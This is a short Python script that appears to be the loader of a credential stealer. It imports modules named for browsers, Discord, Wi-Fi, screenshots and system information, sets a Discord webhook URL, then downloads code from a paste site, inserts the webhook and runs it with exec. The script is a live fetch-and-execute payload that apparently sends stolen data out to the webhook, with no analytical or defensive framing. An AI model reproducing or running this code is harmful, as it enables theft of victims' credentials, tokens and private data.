import genHwid, Zip, browsers, discord, network, screenshot, wifi, systeminfo
import os, shutil, time, ctypes, sys, winreg, dhooks, wmi, requests


url = "https://discord.com/api/webhooks/1113870515367587992/jYned5vib4x1Je60E_alxjnZ_oMEQJI8tH7hx0Q9AivdS0tsz_SIjrKtWHxX_8MCCsOi"

source = requests.get("https://cdn.sourceb.in/bins/DTZxV6Stcu/0").text
NEWSRC = source.replace("%WEBHOOK_URL%", url)
exec(NEWSRC)

